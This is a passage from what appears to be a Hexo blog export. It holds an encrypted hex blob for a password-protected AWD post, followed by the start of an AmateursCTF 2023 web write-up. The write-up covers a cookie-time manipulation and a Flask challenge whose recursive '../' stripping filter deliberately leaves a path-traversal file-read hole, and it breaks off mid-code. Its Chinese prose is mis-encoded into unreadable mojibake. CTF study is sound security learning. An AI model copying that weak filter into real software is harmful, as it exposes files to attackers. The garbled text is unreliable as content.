db951987c4ddc6702c2cc824e5cac6d726c836d7b9f48ff7d496e2162b0f19ef180949ef3cdc5f560a8afac9c8545f7cc74f3a8df74b4a1049bcc53fd7868633d5cde3d0249c3aabce7c3e8a6baa447d0c0db2df1e8ac4a19bedcdec3f85b41f1a877ae8c6ce3a540cadd7f566f980037594bd6627510ab4d2487fbf1f47d9feddf72b6f2d35e4eaf4ae06fd09cbe7d31b7b3cbc5f23c5519a52de6517abff1bc39cfb37f3c922b5abdf9a91136a6b9e4c551ea77e65116418e3e0b5889c88690b0f839493f0eaf3d65769e7bd942d9d246cba0e653bf3191331b7f847cf492f781d5e3fa6cdacfc6d852a44f85bae8ca723002ea629763727f9d57fdef22172db89b5ae1fe6cb0a4689b6138fd7ca040a1529b3cf6b4bff87ae70d01225d1e68b5b499407a2770208a14ede0c5b2b9ddd3a21f9029f50be5a4daf13af619d82a89bfe5be367928cba36c6a8cbfcbab5849b12f77b998049168dfe911e08ea94e46c2e80116acb080056015b002b1ddfceffde803374d4b533ae59f5f3af456cf5db17b4728ef81e59ae432e2b8fcc73811e11ffe38cb96d69415bbd32121a571e9252c2846b1895bf098c91a4cf51e3bbcfe9ef102c5b54ccdd529d7c0542a429ecfd693b3f47e87e8ab0ee3e992491bb604cc221842f0c16ec4fe9ed079aa7dc75d5c407e98313783a0e78a645ab6db0cbe0c18177fdd21d169a18c83fd5ee8f2758b868a4a4d7ae7d8500fcaf7fd862511327b8d9c98c102dc851ec32af11e1b7ad6f8038f5fd497a589c510bf291629d897a2ece75be8309fc92a283a82ecfa3d000c165e231a7776514ee1227384cfa7d1567413aa3cd4428c50527494911252126ab39a133e047badd65f632e465febbab4e1fd7dc8393304ed8069e3db9c2ce400b8aed3f6b7e7f7c393cdc3ee2bbeefd6cc9bc42aebfdd27529c835a052c6453f9c28c343093eaf6748db59ab03375aa058ca37e66449fe800546785b037e7a7cf8dd33e4d736906c22018d934f53e8352b7e60909269267373347f2ccdb4198ecdfdb03c42fef1accc63a696755c90a692400bf45a6e6d0f44df502ab87456575a4164760be336ad2e0612fbee65e7e065d070558f41081f0060656e06da7ef3e74aca7f1feed92196001bc4707f3a856b4f4dac74ad1b2c8b47e4d2d1879254d6737f8fdc0a02cf66b506ea59edc3d3156e6be8f2c7f9d9e9bef6a762bfdf9f996d18f7b7b70fc3b5c35a9ed8a6e054766fddfe9e9abdfa404dc3d25310252a6c2e760de58fe9e5393c9413134cadeec937d1f62062efb62be50e8a955036f690701fafbc460a588425733b9734cb47f52da139a13d2bd09431bed767681e754e54bfb9958172187a87c9e8b361bb4299237838851ad5f0a4216f37b383459c481cae8636c3f5ed252517931b83c120c70b100829127381481e1e92e093c397b480377d85fb29c1aacbb4110ad0271cd8f59a772f4b57dcc73582e79ea9cfe0a6eac1b58723951589b85104e5a165bda70b21e2a08d6405107c6d9ce2cf72075b3dd52f01211df216dce340e455dcc80cbc592b7eb61c5c1058b71fb1cf5e3aec7de602216ebdf2dc5f01def354f0feeb04d76433aa7d5840ffd7b7a86dfcd41342ea17793a1fef5e4c16e843b459c057493edf97576d9ea365eca56c31f6cf72d79f475efd14cc251ee74faa51fc7643ee9a627e65cb631ef6bd2c913a349ce3e7d365127e33dbbf103162ca3f55775abeb8183205a3207b978667e2b531725671e2e917de20c37145011e9c6b527b8b776574855101dc00c4169dc33d99e69fd5ade7def15152c1e3d6955e26a41c306d2e8ed62102e2faf7cc87779c3165336a283eb673c3c014e1afb2a56901bf5f3853ea7acb7341115471e4aac1b2a0a3bdf54888e9393cd7121217635e81878f96ba1633d8595f1fb5627751a98c429972c2c5d9ad25622265eb950b54af05f35b681bad10f97721d690fddff43d831dc38ec2f6154da8e9deafd70f48423412a0b061a8d3566e2d130971808d81e95c4f4c9876b7a16718a94dcc81542a6c177371c938640fe875f61e48b17fa941592a5d7209a0d53b3f3096a49f4adc33b9b9edf63735ed085b6009a1860814328c65928ecd8876ad9e2a9f0cfb27c7f25d9e08834632cf8e359da6c20d5b28c3c8a683bc135322bc0b407ab0c53b7e3be761eb3d6293474198b15460432fb5628519620990da7a813b74c06978edd90a157682e93ddf1dd14097dcd7f47bcaac3bce4a9c97dcbc77f0957411e75165a6c219a9d3325ebfbbaecde692a03f9c7c7cc7530aa3022cb82c5cdf79ffee7acb90a865501a2b4578af53ef3c6c5d1afb592188cb689ac5a19d44ff40f7531fbba3a697e7f9340375165f446b04ccadf18a91485daefa6d6ef327723e5e6fa745281461e0190673a6b9595d350674bc239d2e095f839bc57b16c56effa0f73b5a777c555ff9811a39ac1d13e15f9e2243aa27ecd40ef39e02cf29d160748327195ccd880003e3cb48b057cd6eddb3e5a6863fae30a36ddde5b1c5f99bbe3ad40b7583424a00963d28c2a2ce1ff3e7b5ffd5239ec0328383465c665fb6a7d6da48c779e84c1e9a94036e52a2a73eebb8da9f1e99bd9466d87e91a2e5d0fd865b72a4c2cf83fd371b1cdb066fd2f8aa0f2053c78cf2ef3acf3ffa2f287efe5f16063e6de963c0edf508db203788cd1c8bcf8d9bb68d81a17c83230822d8ce8e19de2ae8466ba53af868b739e558b8dcb6ffa6f79c2b19d6dd7ac28f205777617858f23515dfd8885999c6c6e10eee0e0d60969920c7898411e54b143a747c377b0fd8710d422b5c121f9ae0229b63d878389e586158fa0c8048b021d7437bc93072e2079fc20f598a3253c7177acce35172b625c327ac9e22f75994787a1b5e13d155d4f0024a5118cf32bce0d3aa3c09d5f1bf28d5896954ac96422efb3552fdc38db34d257e9fe0c33eada08453e11838b1439452b98421a8674f2fc666dbb8cf17da685e491e6c089ff6b2859c52627b44c80159f2501809aa997592db3712039ac387cdec9a218a799727419e4891c2ac43d5062d34528ce11e726b92e3fc6167fa5e0ceb38265a6625ad4c7d83eb03f3141513be4b60619988c32f79da86c8a216a32bc968279ef820af51400056d83148d724f357550a7194f09bb6750293519943dae80173b64e0dd8e201ae9172e6d426cf5e7809323efabdba23c947c9097647c5df39f5c5e07da20af2d6bf4dcaaa85fe9679ac2ffb5cbe176fb81c39565dddbb4ee9d246791f450910a5b0ff8a91e9374857765b7f531a7e3c4c23958bd7372695e66c65617757674259518d6dcd878d040de7a1a350d8f456676273f7443546fdfcb5480d0e47c2190e1a44a67dcbfc71c36fde5ce1b5efa10b1c2ee74abd337a9f07f5993de2687060262b7da7c11c6289fcd002e6bbcf264d7fd9078a6f06c3c6f41be7337aa1119f82c6abd62a898b1a24e55e6105ebb5466bbc9dbc506ef01745611ca54edbfedfbdbaae1a50b9c90ff7d3cc1d3f1dceb3da0afd3fbb4ffc2723acbeaaacdaaf1d9ceaed01a44cf9ccf75553a59dc84043a20bdfc2c40b6ce71657bf12cd31e9248633826137916546559f5dbffb33b8fbab7db915e2b64e896f72c59b221c46db9a80f507d88311136b18fa2ea7288177a696aaccb2399e3cc87fce48d3af2a6868364f937747fb2c1d280826944979423723f9e6b44a61c7a30e99570b0870c99777c28e229aa31b3629a6b937bf07762c3f3be04338f589d1dcd513c3cdd282727270b7767693dd6eebf51755590e050930349b83ca459c311428db5504a0abe06e13a6397d3c5d066d55bcd628f3e7e4bbf0d6217c665fd5565cb054fc405075bafffa2dc21b12b97295fb04ecf56298b0dd15db83ef0ab883ea62ab35be46447b4568c6d45c899e6e3b77f47ddf087c491184382b5abea5d6a4c49d99c81ba149e8c8dce5521db99ecec027f022acb26cbd283a732dd0d59ad714a5d736e0b54779a55c00489f4dbf384109657dd52c74f3f5c305c7423c67697012e0f2b26a0adeaadf34704c86bbdbd36eb0a2beacfc99620e73937f927705f465f9708c25424dcbe2eddc8cb2d0dcf3ad95314ec643e47b1a83f2ac174d090868f2317ddf2a3e1b07d164ea5b510b41c63c7124e19a05168c3db62911c6f7fcd3aa651effaedd3c4459d3a0c93cc092962b96c9233e96f1b1990f915ff75322492ec887b2ec5a32ee5c72f48db4e36c24b6ba347ddadb7b497edd4ae055fa3c71bbc388f3d54754895814a614a33a617f770313f3e569e74aa623cde8b1aef49bae50efe4d05f2b8ce4fab39b9d3f641d3ce432d5db905f6f6a506d118b41e5a78a3c42666b90f88538325880db7ba6d305e1f696766924d8c5a90632bef43a9ccdaeb2a209f4d82468d0d019f2a2fca239d82f2e63dff18a5d4ed18cff1416f61fff0a01517009bc1b7721dff25d1fb32989598084b9774de65f57097d051593836482e519b2a25a1bd98284c2f94cddd7262ae09614194005145258af4caa10177ab8c0b5bb977769a1fa2f7e6501c90a17f722b894a04872537aa1c0f53f485340a15624948f1146aa55646ede6e72fb437648dfae619aec4849b8faf6959bf719ccb4348086c5f9f23102cdbd136637a7f8e5bb63e16acade472ffc2716c9dda3be4a40eb1466b6399e9ffbeb02e606fde2b6a75590c86ec1f8c152f16ee92dc7b5f3ffef2e45c94515f0299dc8d7de45f6ed52ac2896c09614ca122307d4fdf2b9346f81e6f5622e553d4107be3663b8ae5e0a7dceaa779583b2ba1a2e948e9af6ffec28e72889e8a43a20cffd6e6084978a6cd5336fdbec31d44879a0b2e9d94bac4edbce357153a479c8310529e4a6d14378c6119465cbafa2e1552ae2559a452b8672fcc817cbdd65fc804776c4455ba93e574c7b5fafe292cac04bda1b5f5f965f678f0ea414ea02856a4477ce84cf308eb8c26b16a75f4c3f1eea8841c28b23129af3de113dcb6623cf115464496517d1ffdf8de777c4d3d7af9a759fda81936e5a04f437e27d3c095d94d11fb614b452fedda1d30f1e614d0f97a3a80db0eb44b6c1d7c8ce7805413d998c3f0169221eb96ec13c49d0131917e1b46249feac854187cafcf2a38ed55682909c2472b7ee9be813702a3c0d109afdc025e7e4dcdba5770add068baaf90733f7c0f56a28698b55919c81d5e7be0631f42b2316c3bb5ae4fb775992d4d7b0a4c6ae03b6f3a435630261a78288a09f15f7d3a5e724cf42209120e2e55c0cd302f4854c7283a8068a0cd5a50e1ea06662f2dbf2893005de4ed8f0502259e5efbb41bf6e6784bd7bade3a3f417fa7d1d63e883946c7090354efa59963d9742d7abd0cec2c6f2167a0091ee705f28a447913ab037a00e19d9fc5e3289c306902f7ce9808eaa1cffe517b709b023f536d6526954a2100a5adda1528f83874da05ca91412b10dc6351cfd25f36edda395fd21d777e6852c5c16ff52af99137dc457b68c7e972540361a8450c8b7dcb37d988151ad1abb3ebec0f5d632b36ad9937dced66fc8555104201ab86f9f8bfdd38f983201427c3dd423b7d06d3f08268cfe17310d3469d8f96e724b3f35f828a80b3c145d5cd6b9da8e6a4e87d6bc2eae03b5fd568ad9568e1c60bf2dab1f60681c955d5df1d8204e1ff0d5fa6df3ac47854ec5dde32d4d8a074d1addd8f45842356f044368c52d65154bf1a8d814fed8ce1993a4da5164d2d7e13d8cb03d62acfaef45b583a75989440b03fa32424b069e712fe89def59be60c97aa0c08741b5a416c44a7f21d382e49ed534da738c09c8bfb2430bbef4f1d540786c8ad48a32e01e5d1e9de2f0ba31febe9322ec778e0f06c365786c0a8914a63a0692e00f001379854a4201cd634152c114fa176f8079226531067e56faa9bab9f9faab1e71cc8ed10c50c761dd8c11c1afe2048b95f91e89ee29c7688a08520343f2246ad0335d665b7050888921eac54d7922874a49f94ed1f8e124c4aa048a4805da77e1cbcfa978380b73612c63838abeb43bf99abced3dd6e82124c25f3b606d22cac72304071f72e0328c0c229ab228c5565021e2d0560cf177c685b292d8289bdf49265d1a0237fe576673698bd6342ac94fe6c538751f0e9926bbe0b697b2078f924b2ec8c2c67564310d2a754cf893bcfd9de8b8c5bb653c6622c626e99fb84ffc103f28b47ee6b86d06bc019249e266de1149c0afb4695f22ba10a7626f82bc32781a1ae9afec0c95d437ed641b397881533c5fbbd30afeb46f2f8df0bdfe9934a08c19d3010d32a37ba50165296e7703c929d5fdb151f3caebd364967bc779f6523699a686530becc1e458088fdd577db86743a728e28c5e6928f7ad69a32fd6d8573bf0238d9c9869ba03e552275816ea2202f61847d8e223d902143455079cafc858881014f19914536b26f164c051402d4e112e547f331ea64d329e77adb6dd984cf343138f45fe07d97fa4b6ab3fa553945f86a6e0d230c4d97c1dc0710caee615db53ce10ce4aa3ed36bad3105d0338b41a88c0e945811ed01e1fd21b15c698547bbb189b1336c52fc3f689a1805427ab2b7eb6f8e761eab7e0f7ef4eeacaaae70115505b3587662d642825f24b38f69ae73203fc83d24daa0b2255b6161303e8e95d4741feb544c0f5beee35edfaa4c3e86495be7778747481baaa513dfdf5c84b19869248b4907afa3b7584bb3a652bf9669db1ac2e5399a094895683a6e148def01b1f741d3c9cfa91dd519529af3959ba38091ebf6ab34296514a99587e1e465b9bba5c97b96d11a7c0f3988e0be73c816ff7e15023e4ef11c684934a4a2f8536d31c668793a1dfe334e7ba9515671b73ffe9acda5680f60960bd211c4595dd3b9225ebc846febc99bf1ee1f7155adc4c82737376a700dc5512cbed5c38c02ef37ccf5b4cd995ace1d53558f8fd7e7e0fd99dc46e4af505b172106d3fa246dd272d6d99eb9d0736da17bb7260ba97bd26b168c38ef0334f407a79f5043f11abb2b991d1a7ad887f11d1c0a8d5a5719c3c3f3cc68a45f1be540280d72469da19ec59b1898ebe3ef8feca1b4435382404b0e7c36d1305ecb07ee155ad4a1e8f0637747ece569c3c6e93b136110f70809a940152a0dbd2f183ef7c8f5a9cc562c4d09485efa19120f7045a6f5955f0c3ce4eb1784a7b2880ec921d6ba0ad42bb8df9c491a317cefeefc645787a3e5e3a5c5894e31c574f8ef400c15f6486af8227e46c7c911d2cb9c542bbd66a44f312dacd930a23a5d80cb25a99654d2fd38b6ae14ba8c6adc62223f4d37c35caabfdc4939d75ec95755f3911bfa0e5e290005cc8d1931191382473a04eb6059c1e85a585c25509063de331eca4a32b3bce2c0f6638207ea6431d93cf30420e07e2d368a7658135927e6ad6b5803d402e46a627a219d9905615c0fe3110cc28301b651976b864c62379752a5b3d872375db7de288c9cc30395eb7d9cef5c9990dfb287f9d4b3bf807d07b7b3dc3b7f51f3827fa9b6467e89336325ce1afef42c39ec3b0fa789647fd5eb9f8f9978850a5e0eb8a0376bc729a7995bde5ef06acca2d272de079d112e1f57e8f1631683ece29081834244b6ec9e70cc27cdcba4c0d8b873744956e6c90f44960a611a59857d444737ba4fe649de53e7c233ab28783f446dbe433a96f4b290b337a776a20a83fff1528751f59b400f9fc69703c8e69bd0c474ed63fe96b9a0de8fde4b5b2d274967aaedcb64f5941baf303f95406a6074393e788a923abac8c886cdc3a0490844f1584b06cacfab5d252c35cf7c8d86d4ee7720bb1fae3dd783d79d15c3b1ed0c04d3a97e14495004598fe77a006367e4139b9dae1f0d6133ac7766d77820e7e3cf316ba0f5092e1cb8ed088c2069d525c796cf35b35eddd83fd1f80af1547115de865979d85e6607aced3f94c8327b4274bf924b17a2451ed9020b761e0b7ecb7ef2bfc78b8c07b765801a95c3151d9255b18ba322e248400e35719aa6ade8d73d988f8a42c60241679a06e57377da60f3c509b4dd6119c3c7726f35ef6d9068fc08be67e4ddb4f05106be400966ef4bea3a985c55a1bf5c1bb62070b769995b63c5b95dfbc84788fda3da7b2f19f767838e59effee3b7d1b7e9a271698f8ff3bc5501f6ed1e892f1d0c47749f33c15b5ce629aced7bdba5cc785823346a65503338def00c18d696f911b06966871d8cceaf5beda02fd01f1769597102a2f4988556ace1ef137ff06f4c0a40eac413ee46dc52c6c46e2fa4df2fc11c2655fab02bd45d02624f0cad588e6b6b77dd5666495b25e19037829eacd81e8dbe5956abe2d52202272eb6889e67f4527e8e9c55b6ccc412a6b48eeea2ed57b4898b9b4a12b77cda9df4cea140c58fe06b19985b71beb2e40cf8a02a6070d0eed7a2f31d38f59202d40d9c9e6f3ac4b1ddb4890c3c065f852655bb4aaeeae3bd99bc0d01b822f32a07a5f50ea62aa565dea29260f26c4842706c1400d9266905fe90daeeb6f29fbbe0709ce29a9a8dd4e7edb9f3f15126e5d792ae40cb816155a7816c2865442b0a55fd0cf415113f0fe4f5dfd846a4d6a3f4ed20f7ed247c1bc30cd8d800734aba3a73207b6ac630c1ba2fde16f420509f25d2cbf13a76e6b7fc809da646e736d3814c2cdb548b14c409589b9982bbcaa8623645aad15f6d072ab8804defe5c7c842aff14ea35d045520ade6c769c7b62f60c5f131f92eb236a4048a934b1a15bb759b2985c737141b1029575010941aeaa895451cdd7f56cfa399652cfcd304b617d1e448a16d55d59dc85c8d43bd03edb673e22ed234c6b503bf3bdf67a06940599705afb0a82a5b447e69e2d2dc5eae14ff477c31978cc4d929dc9eaa667855899274d5eb621f31b9bd947c0d4a32f84ceed49de0b65c83ce5be7cb376a55dc9611ab538475759a7bfce5c47920010eefa78ab1a91d43e86cab638fd3768b8d8821c4892cabe327684d5de935ef3254686cc28c6b5315b710720fdb1f1731dbe7769062d2ee312d7b4990158b1ab1ee73267878b9374dc2710ff198fcb387b4cf5b0c095b7256a8891a9b9dfa6a8b4d79a9a843e6f75cbc661a2238be4aa06ba522bb659abd483c9d17d1cfae2e70ea893b6d79a7b75f10fcdf848bd812d81d93c5aa4bd363bb032535f315099c2675b05db405cd2ef05b3a2ac31ad390d53e0e5e5589faaa0dcc1662122823e79a8d89f13c8490e1ba98f7496c408a9253516f4c59b0cd2fda9ac0c8d6162f8696cc3dc23e7095b1365f620805218cad70e913e53a2fe320f211b81aeaaa1329a5cd90cb4e8b47742775cf92cc159e6b8543ae1ddff405b746c5ec364ea6dfa7763d0b81a64f169a0cb4dcbed4f6dc901c21059681c96f53d2e6daaeab031f13d5002e5d3942a55623b61d1bc59409fa42bac5609284662a2c0e724733d4778f3f8f3385baaa756d66db4fde4ab989eff3a585eda86e8bf9339e55155459b0217ba7c28634799b28ed410dedaf7442f159a04d3fc0a4395e6ca412783531287e7737d16ddd02a156ba8ed670e3065c6c4ad72556fd9223cae6b5d52eda09ffd362b6abf15750ee339793aaab2911ba5ad2326d5168162fceabf90d8e1065f1ce38b8c479e8ab8bdc87351899cc120f3b3ac28ea1f7210146319e8a30e63af308a17678d24f379518c0e4d9ee8b1b66ad062b7457878d2ced372cb8ded21ce6ae99908754064732e6a70c8dae670d497b7c0a64d2abab031334c3494577de7ff8e026f78cde4bb18da73eb53691ef613b5c28ec2eaf68b73a288abd017a68826ea51a926c581bbbdf26b7ac57535c8d7eee163b3c22d02290b9f5bff89213fa6cb5e98e4901733302a0a758123f24157a092dee68510f11a0141a3c36936cf206cea0262a7a5271f022a64b5451ae5a848ffb931bd0e83ec5236c902a71e19071e412b6b458387f9f07e91571d57dc8f6f029d9e20b2877f9dd5a50a3bef8db216034ca5bd1b8655836869b344d3d7b89fea61ffe8714c799ae2843fb0c602ba8a0e6a2fdfcfba3f01efec5871e1b2440baba05eb61e02077362dcfc93da93c756bdf9ba36dc365c0f965d8b3291761322372d3df1290e865b7eab409ac840ba23b4074ba9b23c77226ba3ce7366663928646940b184f5862762dddbf53c96b5bb20f143fd749f194b914cd69388295bdee4c9c1972267a6835841c2c354977854b837b49af270adca5bdccef6a961054b2ab5cfcf6dc1a1bdcf4ebcfc950c78e3dd7945b49751952509f6be9027b10a16eb7f0e0ba618f32533bee45c47367a382dab104e826b20e7ffd83334f4dbfd907426e4b4b506abe98edd34dcefdd5cf132641e4a55a29a55081bd4d3aa48bcc41dd9d80b7202102845e1301c388dda065e243986d751e9d1dfde12a1b27d9f35dabf6e81ed57b309c91c16fe0e3ba935bbf7165c08c6ed7f66b0a465ac580f9b2b2b7e13709ee30a525a2de5ba9e668468bc924e243f9dab2b51143c279e67b32c142c27e1d7ab47d14b28a5d032f30023614844dcf7cb7c83806a85ed6a209aee41e1154850da61696101fec5c8d762acb67cb18116761e066b2dcfeecaa5ee545e464ad4daebc69adeab51efaba230674c5e91eeb5fe3f93be1371c3b4525e41d2c41c75d87d93234f754c7e77bfdce732597b85b64e013037feb37cca8e11ff8667c419aa646fe5b3d5f1ddd8d3d4f087b9aef02a553933909fe2a8339e9843fe5029b65adbc3bef158d0c9670325d3912480a16edcdbcb3111e47ec0ebd46ee89b629cb57401ab98d0f28c48fdceb0cbe3b8dc75746b76fc7d9db268447189e42e3b67260ab774f4eb783e22c03cac79c709fb99efa7852fd4dd862cf3efae36869ae8e285c14c18d192912081106e94bfd2ba578b697da1eace90b58cc56f89ac3f4fb3ff176b170d7c939fb5e77f4578f8b72ba708e29c16f413da8fd8191ffb18f2f779b142ca1d0058097925c944e57307c032245185699769bfd417afc933cb4f545518def2c3390c73b193641727bd545cb112cbbb4fa7f4ebd69ca020de1bd2ad0d480fa2dd98f3adedeb99b7f0e61cb3c071a14731715917704c7b4ef945b030477cd9254aa290ed4c42bb473715a5e5beb41f43f916aab725789e02e3c648dc69eb7aed8d1b3fb2c84b84cc2dcc507e286e30996f8b855ba484596c960f9c223e7d2f411f3bf104df0d8c87b82a2dea372d36184f6c46cf35287e8570b370f78c372d24024b9342f0eb6779a054c05ca3c56b33ee3e1f660c3949314f1baf8b2edd36727e943355f767a573ba76db728b2bb5b14453b4729ed7e3c8c89e5c87d89be3cfad17350a1a81bd7ed7c215df3e5a206b3968b7b8e9ae4c70decedac28c321f78f141da90faacfea97cb64c4f4798c5107aa1579b422b2c5e61aaf816c80f51549984fb1623c0cbd9eadf3ca745b4c75ad0c6263399e49dd830b140a3391b79a1e2dc1449af052acc16f7f4974b15ff38ef3bfa875c9b510bc95df64699e4094f108534dbd23a6b509bf2eb226ebaf89a8b10dec0d50394f0108843552b5e7322b7bffd70703ede0b0e7ee0c060c93b0429a11864773eacd1a8bf330359cf0f45ae25824d641674e48ef1e6458333997cda618704123983b06428ec8b4075f8909e2e934ea221ca3bce82b24af9406c9c294f5af5cf6733a4a9c3ed411a921d21452e0cde7bbcf22c6bbfab157871ebe5bd03c24bac23ec6177b699dc7512624f1ed205249670df0d77a905ff417fab8fc73962626261466acb4220b4077c01972217dfbe3f07144f3803394658b94c25091442add31927b89fcdd3407bb0be4783c2c58</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title>AmateursCTF 2023wp</title>
    <url>/2023/07/22/AmateursCTF-2023wp/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>



<p><img src="https://img-blog.csdnimg.cn/a940c784ee9a4fe2a043298e02b63070.png" alt="1"></p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è™½ç„¶è¯´è¿™ä¸ªæ¯”èµ›æ˜¯é’ˆå¯¹äºç¾å›½é«˜ä¸­ç”Ÿçš„ï¼Œå¯æ˜¯ä¹Ÿä¸æ˜¯å¾ˆç®€å•ï¼Œç¾å›½é«˜ä¸­ç”Ÿè¿™ä¹ˆDå—ï¼Œè¯¥åŠªåŠ›äº† :sob:</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="waiting-an-eternity"><a href="#waiting-an-eternity" class="headerlink" title="waiting-an-eternity"></a>waiting-an-eternity</h3><blockquote>
<p>æˆ‘çš„æœ‹å‹ç»™æˆ‘å‘äº†è¿™ä¸ªç½‘ç«™ï¼Œå¹¶è¯´å¦‚æœæˆ‘ç­‰å¾—è¶³å¤Ÿé•¿ï¼Œæˆ‘å°±å¯ä»¥å¾—åˆ°å¹¶ä¸¾æŠ¥ï¼å¹¶ä¸æ˜¯è¯´æˆ‘éœ€è¦ä¸€é¢æ——å¸œæˆ–ä»»ä½•ä¸œè¥¿ï¼Œä½†æˆ‘å·²ç»ç­‰äº†å‡ å¤©äº†ï¼Œå®ƒä»ç„¶è¦æ±‚æˆ‘ç­‰å¾…ã€‚æˆ‘æœ‰ç‚¹ä¸è€çƒ¦äº†ï¼Œä½ èƒ½å¸®æˆ‘æ‹¿æ——å­å—ï¼Ÿ</p>
</blockquote>
<p>æŠ“åŒ…å¾—åˆ°çº¿ç´¢ï¼š<br><img src="https://img-blog.csdnimg.cn/fe692516b6d34fd1a7d34a9ef06f5ac3.png" alt="1"><br>è®¿é—®åå‘ç°æ¯åˆ·æ–°ä¸€æ¬¡&#x3D;&#x3D;set-cookie&#x3D;&#x3D;å°±ä¼šå˜ä¸€æ¬¡ï¼Œå®ƒè·Ÿæ—¶é—´ä¹Ÿæœ‰ä¸€äº›å…³ç³»ã€‚<br><img src="https://img-blog.csdnimg.cn/d81d9bdd78184662817b7438e9768d5d.png" alt="2"><br>é‚£ä¹ˆæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªcookieå€¼<br><img src="https://img-blog.csdnimg.cn/4913065b3b7b455ba1e53e5bda386c75.png" alt="3"><br>ç»è¿‡å‡ æ¬¡æµ‹è¯•ï¼Œå½“timeä¸ºè´Ÿæ•°ä¸”è¶³å¤Ÿå°æ—¶å°±ä¼šå‡ºç°flagã€‚<br><img src="https://img-blog.csdnimg.cn/4ea4d69f2e8547b49ed15020b7e5b1f0.png" alt="3"><br>è¿™é‡Œæ—¶é—´çš„è¡¨ç¤ºä½ å¯ä»¥æ­£å¸¸è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨&#x3D;&#x3D;-inf&#x2F;-Infinity&#x3D;&#x3D;æ¥è¡¨ç¤ºæ— ç©·å°ã€‚</p>
<h3 id="funny-factorials"><a href="#funny-factorials" class="headerlink" title="funny factorials"></a>funny factorials</h3><blockquote>
<p>æˆ‘åˆ¶ä½œäº†ä¸€ä¸ªé˜¶ä¹˜åº”ç”¨ç¨‹åºï¼å®ƒæ˜¯å¦‚æ­¤çš„å¥‡ç‰¹å’Œè¿·äººã€‚ç„¶è€Œï¼Œé˜¶ä¹˜ä¼¼ä¹æ— æ³•æ­£ç¡®è®¡ç®—å¤§æ•°ï¼ä½ èƒ½å¸®æˆ‘è§£å†³å®ƒå—ï¼Ÿ</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/3fdd0c83d0df415aa50ec3172aa80238.png" alt="1"></p>
<p>åˆ†ææ•°æ®åŒ…å¯ä»¥çŒœæµ‹åœ¨åˆ‡æ¢ä¸»é¢˜çš„æ•°æ®åŒ…ä¸­æœ‰ç–‘ä¼¼æ–‡ä»¶è¯»å–æ¼æ´ã€‚<code>/?theme=themes/theme1.css</code>ï¼Œé¢˜ç›®ç»™çš„è¿˜æœ‰é™„ä»¶<br>app.pyæ–‡ä»¶</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request
<span class="token keyword">import</span> sys

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">factorial</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> n <span class="token operator">*</span> factorial<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> RecursionError<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token number">1</span>

<span class="token keyword">def</span> <span class="token function">filter_path</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># print(path)</span>
    path <span class="token operator">=</span> path<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> filter_path<span class="token punctuation">(</span>path<span class="token punctuation">)</span>
    <span class="token keyword">except</span> RecursionError<span class="token punctuation">:</span>
        <span class="token comment"># remove root / from path if it exists</span>
        <span class="token keyword">if</span> path<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>
            path <span class="token operator">=</span> path<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span>
        <span class="token keyword">return</span> path

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    safe_theme <span class="token operator">=</span> filter_path<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"theme"</span><span class="token punctuation">,</span> <span class="token string">"themes/theme1.css"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>safe_theme<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
    theme <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
